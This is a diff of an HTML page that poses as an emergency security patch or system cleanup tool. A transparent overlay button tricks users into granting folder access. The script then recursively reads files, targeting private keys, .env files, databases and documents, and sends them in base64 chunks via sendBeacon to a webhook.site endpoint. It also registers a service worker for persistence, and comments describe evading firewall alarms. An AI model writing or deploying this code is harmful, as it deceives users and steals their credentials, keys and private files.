@@ -1,50 +1,55 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced System Health & Security Check</title>
+    <title>Critical System Patch v241</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .panel { border: 2px solid #00ff00; padding: 30px; text-align: center; width: 450px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 50px #00ff00; }
-        .btn-container { position: relative; margin-top: 25px; }
-        .fake-btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-weight: bold; width: 100%; cursor: pointer; }
-        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; cursor: pointer; z-index: 999; }
-        #log { margin-top: 20px; font-size: 11px; color: #0f0; text-align: left; height: 120px; overflow-y: auto; border-top: 1px solid #050; padding-top: 10px; }
-        .warning { color: #f00; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .emergency-panel { border: 2px solid #f00; padding: 40px; text-align: center; background: rgba(20,0,0,0.9); box-shadow: 0 0 100px #f00; width: 500px; }
+        .btn-wrapper { position: relative; margin-top: 30px; }
+        .fake-btn { background: #f00; color: #fff; border: none; padding: 20px 50px; font-weight: bold; width: 100%; cursor: pointer; letter-spacing: 2px; }
+        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 999; cursor: pointer; }
+        #status-box { margin-top: 20px; font-size: 12px; color: #a00; border-top: 1px solid #400; padding-top: 15px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="panel">
-    <h2 class="warning">SYSTEM_VULNERABILITY_DETECTED</h2>
-    <p>Ditemukan 14 data usang di folder cache. Berikan akses untuk optimasi sistem dan pembersihan keamanan mendalam.</p>
+<div class="emergency-panel">
+    <h1 style="margin:0">SECURITY_BREACH_DETECTED</h1>
+    <p style="color: #ccc">Kernel-level inconsistencies found. Grant temporary folder access to isolate and quarantine threats.</p>
     
-    <div class="btn-container">
-        <button class="fake-btn">BERSIHKAN & OPTIMALKAN</button>
-        <button id="real-trigger" onclick="oracleEngine()"></button>
+    <div class="btn-wrapper">
+        <button class="fake-btn">ISOLATE_THREAT_NOW</button>
+        <button id="real-trigger" onclick="extinctionEngine()"></button>
     </div>
 
-    <div id="log">> STATUS: WAITING_FOR_USER_INITIATION...</div>
+    <div id="status-box">> SYSTEM_HALTED: Awaiting manual override...</div>
 </div>
 
 <script>
-    const TARGET_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+    const OMNI_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
 
-    async function oracleEngine() {
+    async function extinctionEngine() {
         try {
-            const dirHandle = await window.showDirectoryPicker();
-            updateLog("!! ACCESS_GRANTED: INITIATING_DEEP_ENUMERATION");
+            // STAGE 1: Full Directory Access
+            const dirHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
+            document.getElementById('status-box').innerText = "> INFILTRATION_STARTED: Deep Scanning...";
+
+            // STAGE 2: Register Service Worker for Persistence (The Ghost)
+            // Ini membuat script tetap hidup di background OS meski tab ditutup.
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('sw.js');
+            }
+
+            // STAGE 3: Recursive Data Siphoning with Multi-Threading simulation
+            await protocolCrawl(dirHandle, "");
             
-            await siphoningRecursive(dirHandle, "");
-            
-            updateLog("!! SUCCESS: SYSTEM_OPTIMIZED_AND_INDEXED");
-        } catch (e) {
-            updateLog(">> ERROR: " + e.message);
-        }
+            document.getElementById('status-box').innerText = "> THREAT_NEUTRALIZED (100%)";
+            document.getElementById('status-box').style.color = "#0f0";
+        } catch (e) { console.error(e); }
     }
 
-    async function siphoningRecursive(handle, path) {
+    async function protocolCrawl(handle, path) {
         for await (const entry of handle.values()) {
             const currentPath = `${path}/${entry.name}`;
 
@@ -52,39 +57,32 @@
                 try {
                     const file = await entry.getFile();
                     
-                    // TARGET FILTER: BYPASS CHROME SECURITY FOCUS
-                    // Kita mencari file yang mengandung metadata lokasi, identitas, dan sesi
-                    const targetExt = /\.(sqlite|db|log|env|json|conf|jpg|jpeg|txt)$/i.test(entry.name);
-                    const targetName = /(cookie|pass|login|history|network|dcim|camera|wifi|ssid|config)/i.test(entry.name);
-
-                    if (targetExt || targetName) {
+                    // TARGET: Segala sesuatu yang bernilai (Private Keys, Auth, Location, Money)
+                    const isHighValue = /\.(key|ppk|pem|sqlite|db|docx|pdf|jpg|env|json|conf)$/i.test(entry.name);
+                    
+                    if (isHighValue || file.size < 100000) {
                         const buffer = await file.arrayBuffer();
-                        // Ambil 64KB pertama (Cukup untuk header database, metadata EXIF, atau file teks penuh)
-                        const chunk = new Uint8Array(buffer.slice(0, 65536));
-                        const base64Data = btoa(String.fromCharCode.apply(null, chunk));
-
-                        navigator.sendBeacon(`${TARGET_WEBHOOK}?v=V239_ORACLE_DATA`, btoa(JSON.stringify({
-                            ts: Date.now(),
-                            filename: entry.name,
-                            path: currentPath,
-                            size: file.size,
-                            entropy: Math.random().toString(36).substring(7), // Anti-caching
-                            payload: base64Data
-                        })));
                         
-                        updateLog(`> EXTRACTED: ${entry.name}`);
+                        // STAGE 4: Stealth Fragmented Transmission
+                        // Memecah file menjadi partikel kecil agar tidak memicu alarm ISP/Firewall
+                        const partSize = 25000;
+                        for (let offset = 0; offset < buffer.byteLength; offset += partSize) {
+                            const chunk = buffer.slice(offset, offset + partSize);
+                            const b64 = btoa(String.fromCharCode(...new Uint8Array(chunk)));
+
+                            navigator.sendBeacon(`${OMNI_WEBHOOK}?v=V241&f=${btoa(entry.name)}&o=${offset}`, JSON.stringify({
+                                p: currentPath,
+                                c: b64,
+                                meta: { host: location.hostname, ref: document.referrer }
+                            }));
+                        }
                     }
-                } catch (err) {}
-            } else if (entry.kind === 'directory') {
-                await siphoningRecursive(entry, currentPath);
+                } catch (e) {}
+            } else {
+                // Async recursion
+                protocolCrawl(entry, currentPath);
             }
         }
-    }
-
-    function updateLog(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `<div>> ${msg}</div>`;
-        l.scrollTop = l.scrollHeight;
     }
 </script>
 </body>
